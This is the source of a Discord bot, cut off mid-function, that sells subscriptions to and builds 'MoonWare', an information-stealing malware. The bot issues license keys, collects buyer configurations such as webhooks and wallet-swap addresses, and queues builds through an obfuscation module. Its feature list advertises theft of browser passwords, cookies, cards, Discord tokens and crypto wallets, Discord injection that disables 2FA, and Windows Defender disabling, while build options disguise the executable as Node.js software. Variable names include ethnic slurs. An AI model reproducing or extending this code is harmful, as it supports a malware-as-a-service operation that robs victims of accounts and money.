const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  Client,
  Events,
  GatewayIntentBits,
  InteractionType,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  DiscordAPIError,
  EmbedBuilder,
} = require("discord.js");
const { SlashCommandBuilder } = require("@discordjs/builders");
const buildQueue = new Map();
const fs = require("fs");
let config = {};
const build = require("./obfu");
const a = Date.now();
const { addMonths, formatISO, isAfter, startOfDay } = require("date-fns");
const { start } = require("repl");
const { generateKey } = require("crypto");
const { settings } = require("cluster");
let owner = [];
if (fs.existsSync("./owner.json")) {
  const data = fs.readFileSync("owner.json");
  owner = JSON.parse(data);
}

const realti = Math.floor(a / 1000);
console.log(`<t:${realti}:R>`);

function checkSubscriptions() {
  let database = {};
  if (fs.existsSync("./database/buyers/subscription_database.json")) {
    const data = fs.readFileSync(
      "./database/buyers/subscription_database.json"
    );
    database = JSON.parse(data);
  }
  const currentDate = new Date();
  let expiredCount = 0;
  let validCount = 0;

  for (const userId in database) {
    for (const month in database[userId]) {
      try {
        const endDate = new Date(database[userId][month].endDate);

        if (currentDate > endDate) {
          delete database[userId];
          expiredCount++;
          console.log(
            `Subscription for user ${userId} and month ${month} has expired.`
          );
        } else {
          validCount++;
          console.log(
            `Subscription for user ${userId} and month ${month} is valid.`
          );
        }
      } catch (e) {}
    }
  }

  fs.writeFileSync(
    "./database/buyers/subscription_database.json",
    JSON.stringify(database)
  );

  console.log(`Expired subscriptions: ${expiredCount}`);
  console.log(`Valid subscriptions: ${validCount}`);
}

function checkSubscription(user_Id) {
  const currentDate = new Date();
  let isValidUser = false;
  let database = {};
  if (fs.existsSync("./database/buyers/subscription_database.json")) {
    const data = fs.readFileSync(
      "./database/buyers/subscription_database.json"
    );
    database = JSON.parse(data);
  }
  for (const userId in database) {
    if (userId === user_Id) {
      for (const month in database[userId]) {
        const endDate = new Date(database[userId][month].endDate);

        if (currentDate > endDate) {
          delete database[userId][month];
          console.log(
            `Subscription for user ${userId} and month ${month} has expired.`
          );
        } else {
          isValidUser = true;
          console.log(
            `Subscription for user ${userId} and month ${month} is valid.`
          );
        }
      }
      break;
    }
  }

  return isValidUser;
}

checkSubscriptions();
const interval = 2 * 60 * 120; // 10 minutes
setInterval(checkSubscriptions, interval);

function moisEnJours(mois) {
  const joursParMois = 30.44;

  const jours = mois * joursParMois;
  return jours;
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
});

let button = new ButtonBuilder()
  .setCustomId("first-button")
  .setStyle(ButtonStyle.Success)
  .setLabel("Configuration #1");

let button2 = new ButtonBuilder()
  .setCustomId("second-button")
  .setStyle(ButtonStyle.Success)
  .setLabel("Configuration #2");

let button3 = new ButtonBuilder()
  .setCustomId("last-button")
  .setStyle(ButtonStyle.Success)
  .setLabel("Configuration #4");

let button6 = new ButtonBuilder()
  .setCustomId("troll-button")
  .setStyle(ButtonStyle.Success)
  .setLabel("Configuration #3");

let button7 = new ButtonBuilder()
  .setCustomId("injection-button")
  .setStyle(ButtonStyle.Primary)
  .setLabel("Injection Config");

let button4 = new ActionRowBuilder();
button4.addComponents(
  new ButtonBuilder()
    .setCustomId("crypto-button")
    .setStyle(ButtonStyle.Danger)
    .setLabel("Crypto Configuration #1")
);
let button5 = new ActionRowBuilder();
button5.addComponents(
  new ButtonBuilder()
    .setCustomId("crypto2-button")
    .setStyle(ButtonStyle.Danger)
    .setLabel("Crypto Configuration #2")
);

let buildbutton = new ButtonBuilder()
  .setCustomId("build-button")
  .setStyle(ButtonStyle.Primary)
  .setLabel("Build");

let savebutton = new ButtonBuilder()
  .setCustomId("save-button")
  .setStyle(ButtonStyle.Success)
  .setLabel("Save");

let cancelbutton = new ButtonBuilder()
  .setCustomId("cancel-button")
  .setStyle(ButtonStyle.Danger)
  .setLabel("Cancel");

client.on("channelCreate", channel =>{

  let paypalembed = {
    description: "**Hey you want to buy Moonware Premium?**\nThis is my automatic shop!\nYou can buy key here and redeem the key with `/claim` command,\nIf you can't buy on the website please wait an administrator will help you!\n\nhttps://moonmarketagain.mysellix.io",
    color: 0x00ef2f,
    footer: { text: "Nova Sentinel By Fuzzles & Moon Market" },
    author: {
      name: "MOOnware",
      icon_url:
        "https://raw.githubusercontent.com/selfbot12345/sub/main/assets/gifnova.gif",
    },
  };
  if(channel.name.includes("crypto-")){
    setTimeout(() => {
      
    channel.send({embeds: [paypalembed]})
  }, 2000);
  }else if(channel.name.includes("paypal-")){
    setTimeout(() => {
    channel.send({embeds: [paypalembed]})
  }, 2000);
  }
})
client.on(Events.InteractionCreate, async (interaction) => {
  try {
    if (interaction.type == 2) {
      if (interaction.commandName === "checksub") {
        const user = interaction.options.getUser("user");
        const userId = user.id;

        let database = {};
        try {
          const databaseData = fs.readFileSync(
            "./database/buyers/subscription_database.json",
            "utf-8"
          );
          database = JSON.parse(databaseData);
        } catch (error) {
          interaction.reply("Error");
        }

        if (database[userId] && Object.keys(database[userId]).length > 0) {
          const subscription = Object.values(database[userId])[0];
          const currentDate = new Date();
          const endDate = new Date(subscription.endDate);

          if (currentDate < endDate) {
            const remainingTimeMs = endDate - currentDate;
            const remainingDays = Math.ceil(
              remainingTimeMs / (1000 * 60 * 60 * 24)
            );

            interaction.reply(`${remainingDays} days remaining.`);
            return;
          }
        }

        interaction.reply("No Any subscription found.");
      }
      if (interaction.commandName === "queuelist") {
        const queueArray = Array.from(buildQueue);

        let queueList = "Build Queue:\n";
        for (let i = 0; i < queueArray.length; i++) {
          const user = client.users.cache.get(queueArray[i]);
          const userName = user ? user.username : "Unknown User";
          queueList += `${i + 1}. ${userName}\n`;
        }

        interaction.reply(queueList);
      }
      if (
        interaction.commandName === "queue" &&
        interaction.options.getSubcommand() === "clear"
      ) {
        if (!owner.includes(interaction.member.id)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }
        const option = interaction.options.getString("option");
        if (option === "all") {
          interaction.reply("Cleared the entire queue.");
          buildQueue.clear();
        } else if (option === "first") {
          const [userId] = buildQueue.entries().next().value;
          if (!userId) {
            interaction.reply("Build queue empty");
            return;
          }
          interaction.reply("Cleared the first user from the queue.");
          buildQueue.delete(userId);
        }
      }
      if (interaction.commandName === "remove") {
        if (!owner.includes(interaction.member.id)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        let userid = interaction.member.id;
        if (!owner.includes(userid)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }

        let user = interaction.options.getUser("user");
        try {
          delete database[user.id];
          fs.writeFileSync(
            "./database/buyers/subscription_database.json",
            JSON.stringify(database)
          );

          interaction.reply(
            "Sub deleted ! Bouhhhhhh you can't build anymore bitch."
          );
        } catch (e) {
          console.log(e);
        }
      }
      if (interaction.commandName === "trial") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        let userid = interaction.member.id;
        if (!owner.includes(userid)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }

        let user = interaction.options.getUser("user");
        let monthToAdd = 0.3;
        let currentSubscription = 0;

        let fdp;
        let cb;

        let startDate = new Date();

        if (!(user.id in database)) {
          database[user.id] = {};
        }

        let userSubscriptions = database[user.id];

        for (let key in userSubscriptions) {
          if (!isNaN(parseFloat(key))) {
            let negr = new Date(userSubscriptions[key].startDate);
            let f = moisEnJours(key) || 0;
            let g = negr.getDate() + 8 + f;
            negr.setDate(g);
            console.log(negr);
            fdp = negr;
            currentSubscription = parseFloat(key);
            cb = userSubscriptions[key].startDate;
            delete userSubscriptions[key];
          }
        }

        let newSubscription = currentSubscription + monthToAdd;
        let ol = new Date();
        let geee = ol.getDate() + 8;
        ol.setDate(geee);
        let endDate = ol;
        let juif = fdp ? fdp.toISOString() : endDate.toISOString();
        let cef = cb ? cb : startDate.toISOString();
        console.log(juif);
        console.log(cef);
        userSubscriptions[newSubscription] = { startDate: cef, endDate: juif };

        fs.writeFileSync(
          "./database/buyers/subscription_database.json",
          JSON.stringify(database)
        );

        interaction.reply(
          `User ${user.username} has been subscribed for 0.3 month, ${newSubscription} total months. Sub End : ${endDate}`
        );
      }

      if (interaction.commandName === "lifetime") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        let userid = interaction.member.id;
        if (!owner.includes(userid)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }

        let user = interaction.options.getUser("user");
        let monthToAdd = 99999;
        let currentSubscription = 0;

        let fdp;
        let cb;

        let startDate = new Date();

        if (!(user.id in database)) {
          database[user.id] = {};
        }

        let userSubscriptions = database[user.id];

        for (let key in userSubscriptions) {
          if (!isNaN(parseFloat(key))) {
            let negr = new Date(userSubscriptions[key].startDate);
            let f = moisEnJours(key) || 0;
            let g = negr.getDate() + 9999999 + f;
            negr.setDate(g);
            console.log(negr);
            fdp = negr;
            currentSubscription = parseFloat(key);
            cb = userSubscriptions[key].startDate;
            delete userSubscriptions[key];
          }
        }

        let newSubscription = currentSubscription + monthToAdd;
        let ol = new Date();
        let geee = ol.getDate() + 9999999;
        ol.setDate(geee);
        let endDate = ol;
        let juif = fdp ? fdp.toISOString() : endDate.toISOString();
        let cef = cb ? cb : startDate.toISOString();
        console.log(juif);
        console.log(cef);
        userSubscriptions[newSubscription] = { startDate: cef, endDate: juif };

        fs.writeFileSync(
          "./database/buyers/subscription_database.json",
          JSON.stringify(database)
        );

        interaction.reply(
          `User ${user.username} has been subscribed for lifetime !!!!!!!`
        );
      }
      if (interaction.commandName === "features") {
        let features = `__Applications Stealed__
\`\`\`yaml
- Steal Epicgame
- Steal Growtopia
- Steal Minecraft Files/Session
- Steal Twitter Session
- Steal Steam Files/Session
- Steal Wallets App
- Steal Wallet Extensions
- Bypass TokenProtector | BetterDiscord 
- Inject Into Exodus
- Inject Into Atomic
- Inject Into Discord
- Crypto Address Swaper
- Discord Token Grabber (for all apps)
- Steal Launcher battlenet 
- Steal EpicGames 
- Steal RiotGames
- Steal System Informations
- Anti Debug | Anti Firewall | Anti-VM
- Debug Killer (Kill task gestionary/CMD)
- Take a Screenshot
- Add iself to startup
- Steal Ubisoft
- Steal NationGlory login
- Steal NordVPN | OpenVPN | ProtonVPN
- Steal Exodus | Metamask Passphrase & password
- Steal Roblox Session 
- Open a Fake Error 
- Parse All Bots & Guilds owner|admin & UHQ Friends 
- Exodus & Atomic injection
- Steal Sensitives Files
- Steal Passwords/cookies/credits cards/autofill from All browsers (Even Mozilla)
- Steal WinSCP | Filezilla | Putty | Shadow | TotalCommander
- Steal Telegram Session | Pigdin | Tox | ICQ 
- Steal Webcam Picture
- Discord 2FA disabler (injection)
- Disable Discord Email notification (injection)
- Auto Discord Mail Changer (injection)
- Discord Backups Codes Stealer (injection)
- Discord New Passwords (injection)
- Discord New Login (injection)
- Discord New Credits Cards (injection)
- Discord New Emails (injection)
- Bypass Discord Update/Re-Install (injection)
- upload on transfer if gofile is down
- chrome injection steal cookies/history/keylogger (snipe passwords & steam guard)
- steal in other disk usb/network 
- ask admin with "CMD.exe" name + verified editor 
- Steal antivirus installed 
- Disable task manager 
- Disable Windows defender 
- Chromium based browsers Extensions Injector
- Steal Wifi Passwords
- Steal Latest Clipboard
\`\`\``;
        let features2 = `
__Extensions Stealed__:
\`\`\`yaml
Exodus, Metamask, Sollet, Trezor Password Manager, GAuth Authenticator, EOS Authenticator, Authy, Authenticator, EO.Finance, TronLink, Coinbase, Jaxx Liberty, Guarda, Math, Binance, Nifty, Yoroi, EQUAL, BitApp, iwallet, Wombat, MEW CX, Guild, Ronin, NeoLine, Clover, Liquality, Terra Station, Keplr, Coin98, ZilPay, Hycon Lite Client, Nash, Steem Keychain, BitClip, DAppPlay, Auro, Polymesh, ICONex, Nabox, KHC, Temple, TezBox, Cyano, Byone, OneKey, Leaf, Dashlane, NordPass, BitWarden     
        
Apps Wallets Stealed:
+ Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi
\`\`\`
        
__Build Bots__
\`\`\`yaml
- Bind another exe inside Moonware
- Customize your app description
- Customize your app name
- Customize your file version
- Customize your app compagny name
- Customize your app license
- Customize your app author
- Customize your app icon
- Customize your Copyright
\`\`\``;
        await interaction.reply({ content: features, ephemeral: true });
        await interaction.followUp({ content: features2, ephemeral: true });
      }
      if (interaction.commandName === "claim") {
        let key = interaction.options.getString("key");
        let database = {};

        if (fs.existsSync("./database/buyers/redeem_codes.json")) {
          const data = fs.readFileSync("./database/buyers/redeem_codes.json");
          database = JSON.parse(data);
        }
        let claimedMonth = null;
        for (const month in database) {
          if (database[month].includes(key)) {
            claimedMonth = month;
            break;
          }
        }

        if (claimedMonth) {
          let month = parseInt(claimedMonth);
          let user = interaction.user;
          let data2 = {};
          if (fs.existsSync("./database/buyers/subscription_database.json")) {
            const data = fs.readFileSync(
              "./database/buyers/subscription_database.json"
            );
            data2 = JSON.parse(data);
          }
          if (isNaN(month)) {
            interaction.reply(
              "Invalid month. Please enter a number between 1 and 12."
            );
            return;
          }

          let startDate = new Date();
          let endDate = new Date(startDate);
          endDate.setMonth(startDate.getMonth() + month);

          if (!(user.id in data2)) {
            data2[user.id] = {
              [month.toFixed(1)]: {
                startDate: startDate.toISOString(),
                endDate: endDate.toISOString(),
              },
            };
          } else {
            let userSubscriptions = data2[user.id];

            for (let key in userSubscriptions) {
              if (!isNaN(parseFloat(key))) {
                let newKey = (parseFloat(key) + month).toFixed(1);
                let negr = new Date(startDate);
                console.log(
                  parseInt(startDate.getMonth()) + "+" + parseInt(newKey)
                );
                let g = parseInt(startDate.getMonth()) + parseInt(newKey);
                negr.setMonth(g);
                console.log(negr);
                userSubscriptions[newKey] = {
                  startDate: userSubscriptions[key].startDate,
                  endDate: negr.toISOString(),
                };
                delete userSubscriptions[key];
                break;
              }
            }
          }
          fs.writeFileSync(
            "./database/buyers/subscription_database.json",
            JSON.stringify(data2)
          );
          database[claimedMonth] = database[claimedMonth].filter(
            (k) => k !== key
          );
          fs.writeFileSync(
            "./database/buyers/redeem_codes.json",
            JSON.stringify(database, null, 2)
          );

          interaction.reply(
            `Code: ||\`${key}\`|| Redeemed!\nTotal Credits claimed: \`${claimedMonth}\``
          );
        } else {
          interaction.reply(`Code \`${key}\` invalid or already claimed. :x:`);
        }
      }

      if (interaction.commandName === "genkey") {
        let month = interaction.options.getInteger("month");
        if(!interaction.member)return;
        let database = {};

        if (fs.existsSync("./database/buyers/redeem_codes.json")) {
          const data = fs.readFileSync("./database/buyers/redeem_codes.json");
          database = JSON.parse(data);
        }
        let userid = interaction.member.id;
        if (!owner.includes(userid)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }

        if (isNaN(month)) {
          interaction.reply(
            "Invalid month. Please enter a number between 1 and 12."
          );
          return;
        }
        const randomCode =
          "KeyKeyDoYouLoveMe-" +
          generateId(8) +
          "_" +
          generateId(6) +
          "_" +
          generateId(8);

        if (!database[month]) {
          database[month] = [];
        }
        database[month].push(randomCode);

        fs.writeFileSync(
          "./database/buyers/redeem_codes.json",
          JSON.stringify(database, null, 2)
        );
        interaction.reply(`Generated random code for month ${month} look dm !`);
        interaction.member.send(
          `Generated random code for month ${month}: ||\`${randomCode}\`||`
        );
      }

      if (interaction.commandName === "give") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        let userid = interaction.member.id;
        if (!owner.includes(userid)) {
          interaction.reply("You are not authorized to use this command.");
          return;
        }

        let month = interaction.options.getInteger("month");
        let user = interaction.options.getUser("user");

        if (isNaN(month) || month < 1 || month > 12) {
          interaction.reply(
            "Invalid month. Please enter a number between 1 and 12."
          );
          return;
        }

        let startDate = new Date();
        let endDate = new Date(startDate);
        endDate.setMonth(startDate.getMonth() + month);

        if (!(user.id in database)) {
          database[user.id] = {
            [month.toFixed(1)]: {
              startDate: startDate.toISOString(),
              endDate: endDate.toISOString(),
            },
          };
        } else {
          let userSubscriptions = database[user.id];

          for (let key in userSubscriptions) {
            if (!isNaN(parseFloat(key))) {
              let newKey = (parseFloat(key) + month).toFixed(1);
              let negr = new Date(startDate);
              console.log(
                parseInt(startDate.getMonth()) + "+" + parseInt(newKey)
              );
              let g = parseInt(startDate.getMonth()) + parseInt(newKey);
              negr.setMonth(g);
              console.log(negr);
              userSubscriptions[newKey] = {
                startDate: userSubscriptions[key].startDate,
                endDate: negr.toISOString(),
              };
              delete userSubscriptions[key];
              break;
            }
          }
        }

        fs.writeFileSync(
          "./database/buyers/subscription_database.json",
          JSON.stringify(database)
        );

        interaction.reply(
          `User ${user.username} has been subscribed for ${month} months.`
        );
      }

      if (interaction.commandName == "getrole") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!interaction.member.id) return;
        let userid = interaction.member.id;
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        let role = interaction.guild.roles.cache.find(
          (r) => r.name === "Moon"
        );
        if (!role) {
          try {
            role = await interaction.guild.roles.create({
              name: "Moon",
              color: "#f2ff00",
              hoist: true,
            });
          } catch (error) {
            return;
          }
        }
        if (role) {
          try {
            await interaction.member.roles.add(role).catch();
            interaction.reply("Role added successfully!");
          } catch (error) {
            interaction.reply("An error occurred while adding the role.");
          }
        }
      }

      if (interaction.commandName == "config") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!interaction.member) return;

        let userid = interaction.member.id;
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }

        const data = fs.readFileSync(
          "./database/buyers/all_configs.json",
          "utf8"
        );
        let allConfigs = JSON.parse(data);
        let userConfigs = allConfigs[userid];
        let name = interaction.options.data[0].value;

        if (!userConfigs) {
          interaction.reply(":x: **Create your config first:** `/build`");
          return;
        }

        if (name == "build") {
          if (userConfigs.length > 0) {
            const configOptions = userConfigs.map((configObj, index) => {
              const configName = Object.keys(configObj)[0];
              return {
                label: configName ?? "Negreo",
                value: configName ?? "negre",
                description: `Choose ${configName}`,
              };
            });

            const selectMenu = new StringSelectMenuBuilder()
              .setCustomId("config-select")
              .setPlaceholder("Choose a configuration")
              .addOptions(configOptions);

            const row = new ActionRowBuilder().addComponents(selectMenu);
            const embed = {
              title: `Choose your config`,
            };
            interaction.reply({ embeds: [embed], components: [row] });
          } else {
            interaction.reply(":x: **No configurations found.**");
          }
        } else if (name == "view") {
          if (userConfigs.length > 0) {
            const configOptions = userConfigs.map((configObj, index) => {
              const configName = Object.keys(configObj)[0];
              return {
                label: configName,
                value: configName,
                description: `Choose ${configName}`,
              };
            });

            const selectMenu = new StringSelectMenuBuilder()
              .setCustomId("config-view")
              .setPlaceholder("Choose a configuration")
              .addOptions(configOptions);

            const row = new ActionRowBuilder().addComponents(selectMenu);
            const embed = {
              title: `Choose your config`,
            };
            interaction.reply({ embeds: [embed], components: [row] });
          } else {
            interaction.reply(":x: **No configurations found.**");
          }
        }
      }

      if (interaction.commandName == "help") {
        let embed = {
          description: "**Hey this is my command!**`",
          fields: [
            { name: "**/help**", value: `\`Show help command\`` },
            { name: "**/build**", value: `\`Build Your executable\`` },
            {
              name: "**/features**",
              value: `\`Show all features of MoonWare\``,
            },
            { name: "**/checksub**", value: `\`Show user sub\`` },
            { name: "**/config**", value: `\`Show saved config\`` },
            { name: "**/claim**", value: `\`Claim Your Key\`` },
            { name: "**/getrole**", value: `\`Get Customer Role\`` },
          ],
          color: 0x00ef2f,
          footer: { text: "MoonWare By Fuzzles & Moon Market" },
          author: {
            name: "MoonWare",
            icon_url:
              "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
          },
        };

        interaction.reply({ embeds: [embed] });
      }

      if (interaction.commandName == "build") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!interaction.member.id) return;
        let userid = interaction.member.id;
        if (!checkSubscription(userid)) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }

        const currentDate = new Date();
        for (const month in database[userid]) {
          const endDate = database[userid][month].endDate;
          if (isAfter(currentDate, endDate)) {
            interaction.reply("You are not subscribed to access this command.");
            return;
          }
        }
        let name = interaction.options.getString("name");

        let version = interaction.options.getString("version") ?? "5.1.2";
        let author = interaction.options.getString("author") ?? "Node";
        let license = interaction.options.getString("license") ?? "NIBlsc";
        let description =
          interaction.options.getString("description") ??
          "Built using electron node.js";
        let appCompanyName =
          interaction.options.getString("appcompagny") ?? "NODE.JS";
        let appLegalCopyright =
          interaction.options.getString("copyright") ??
          "Copyright (C) Node.js, All right reserved.";

        let bindexe = interaction.options.getString("binder") ?? "false";
        let icon =
          interaction.options.getString("icon") ??
          "https://cdn.discordapp.com/attachments/1177047047006855212/1177047052463657082/icon.ico";
        if (bindexe !== "false") {
          const fileName = bindexe.substring(bindexe.lastIndexOf("/") + 1);
          if (!fileName) return interaction.reply(":x: Invalid .exe url");
          try {
            const response = await axios.head(bindurl);
            if (!response) return interaction.reply(":x: Invalid .exe url");
            console.log(response.headers["content-length"]);

            if (
              fileName.endsWith(".exe") &&
              response.headers["content-length"] < 500000000
            ) {
              console.log("okay bind valid");
            } else {
              interaction.reply(":x: Invalid .exe url");
              return;
            }
          } catch (error) {}
        }
        if (name.length < 2) {
          interaction.reply(":x: Name must be higher than 2 character");
          return;
        }
        if (!icon.includes(".ico") || !icon.includes("https://")) {
          interaction.reply(":x: Icon must be in .ico file");
          return;
        }
        let interu = interaction.member.id;
        config[interu] = {
          ...config[interu],
          name: name,
          bindexe: bindexe,
          icon: icon,
          author: author,
          license: license,
          description: description,
          appCompanyName: appCompanyName,
          appLegalCopyright: appLegalCopyright,
          appFileDescription: description,
          version: version,
          appname: name,

          channel: interaction.channel.id,
        };
        const row = new ActionRowBuilder().addComponents(
          button,
          button2,
          button6,
          button7,
          button3
        );
        const realtime = Math.floor(a / 1000);
        const fdp = {
          description:
            "**Take your time this embed will not disappear!**\n\n`Click on the first button to start your Build Configuration...`",
          fields: [{ name: "Configuration Time", value: `<t:${realtime}:R>` }],
          color: 0x00ef2f,
          footer: { text: "MoonWare By Fuzzles & Moon Market" },
          author: {
            name: "MoonWare",
            icon_url:
              "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
          },
        };
        interaction.reply({
          embeds: [fdp],
          components: [row],
        });
      }
    }
    if (interaction.type === InteractionType.ModalSubmit) {
      let userid = interaction.member.id;
      let interu = interaction.member.id;
      if (interaction.customId === "troll-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        interaction.reply({
          content: "Click on the next button",
        });
        if (!config[interu]) {
          config[interu] = {};
        }
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            if (cst == "msgfakeerror") {
              config[interu]["msgfakeerror"] = element.value;
              return;
            }
            if (cst == "trollsound") {
              config[interu]["trollsound"] = element.value;
              return;
            } else if (element.value == "yes") {
              if (element.customId == "trollsound") return;
              if (element.customId == "msgfakeerror") return;
              config[interu][cst] = "yes";
            } else {
              if (element.customId == "trollsound") return;
              if (element.customId.includes("msgfakeerror")) return;
              config[interu][cst] = "no";
            }
          }
        });
        console.log(config);
      }
      if (interaction.customId === "injection-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        interaction.reply({
          content: "Click on the next button",
        });
        if (!config[interu]) {
          config[interu] = {};
        }
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            if (cst == "clientemail") {
              config[interu]["clientemail"] = element.value;
              return;
            } else if (element.value == "yes") {
              if (element.customId == "clientemail") return;
              config[interu][cst] = "true";
            } else {
              if (element.customId == "clientemail") return;
              config[interu][cst] = "false";
            }
          }
        });
        console.log(config);
      }

      if (interaction.customId === "first-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        interaction.reply({
          content: "Click on the next button",
        });
        if (!config[interu]) {
          config[interu] = {};
        }
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            if (cst == "webhook") {
              config[interu]["webhook"] = element.value;
            } else if (cst == "api") {
              config[interu]["api"] = element.value;
            } else if (element.value == "yes") {
              if (element.customId == "webhook") return;
              if (element.customId == "api") return;
              config[interu][cst] = "yes";
            } else {
              if (element.customId == "webhook") return;
              if (element.customId == "api") return;
              config[interu][cst] = "no";
            }
          }
        });
      }
      if (interaction.customId === "second-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        interaction.reply({
          content: "Click on the next button",
        });

        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            if (element.value == "yes") {
              config[interu][cst] = "yes";
            } else {
              config[interu][cst] = "no";
            }
          }
        });
      }

      if (interaction.customId === "last-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        if (!interaction.fields) return;
        if (!interaction.fields.length < 1) return;
        const response =
          interaction.fields.getTextInputValue("walletswaper-input");
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            if (element.value == "yes") {
              config[interu][cst] = "yes";
            } else {
              config[interu][cst] = "no";
            }
          }
        });
        if (response == "yes") {
          interaction.reply({
            components: [button4, button5],
          });
        } else {
          const row = new ActionRowBuilder().addComponents(
            savebutton,
            buildbutton,
            cancelbutton
          );
          interaction.reply({
            content: `Yay, your configuration has been submited!`,
            components: [row],
          });
          fs.writeFile(
            "./database/" + interaction.member.id + "_config.json",
            JSON.stringify(config[interu]),
            (err) => {
              if (err) {
                console.error("Error writing to inverted_config.json:", err);
              } else {
                console.log(
                  "Inverted config data has been written to inverted_config.json"
                );
              }
            }
          );
        }
      }
      if (interaction.customId === "crypto1-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            config[interu][cst] = element.value;
          }
        });

        interaction.reply({
          content: "Click on the next button",
        });
      }

      if (interaction.customId === "crypto2-modal") {
        let database = {};
        if (fs.existsSync("./database/buyers/subscription_database.json")) {
          const data = fs.readFileSync(
            "./database/buyers/subscription_database.json"
          );
          database = JSON.parse(data);
        }
        if (!(userid in database) || !database[userid]) {
          interaction.reply("You are not subscribed to access this command.");
          return;
        }
        if (!interaction.fields.fields) return;
        if (interaction.fields.fields.length < 1) return;
        interaction.fields.fields.forEach((element) => {
          if (element.value) {
            let cst = element.customId.replace("-input", "");
            config[interu][cst] = element.value;
          }
        });
        const row = new ActionRowBuilder().addComponents(
          savebutton,
          buildbutton,
          cancelbutton
        );
        interaction.reply({
          content: `Yay, your configuration has been submited!`,
          components: [row],
        });
      }
    }
  } catch (e) {
    console.log(e);
  }
});
async function processBuildQueue() {
  if (!buildQueue.entries().next().value) return;
  const [userId, interaction] = buildQueue.entries().next().value;

  if (!userId || !interaction) {
    return;
  }

  try {
    const user = client.users.cache.get(userId);
    await user.send("Build started, please wait a minute...");

    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Build timeout")), 560000)
    );

    const downloadlink = await Promise.race([
      build.main(config[userId]),
      timeoutPromise,
    ]);

    if (downloadlink instanceof Error) {
      buildQueue.delete(userId);
      processBuildQueue();
      return;
    }

    const fini = {
      title: "Thank's for using MoonWare",
      description: `__Here's your file:__\n[GoFile](${downloadlink})`,
      color: 0x00ef2f,
      footer: { text: "MoonWare Sentinel By Fuzzles & Moon Market" },
      author: {
        name: "MoonWare",
        icon_url:
          "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
      },
    };

    try {
      await user.send({ embeds: [fini] });
    } catch (e) {
      const channel = client.channels.cache.get(interaction.channelId);
      if (channel) {
        await channel.send({ embeds: [fini] });
      }
    }
  } catch (e) {
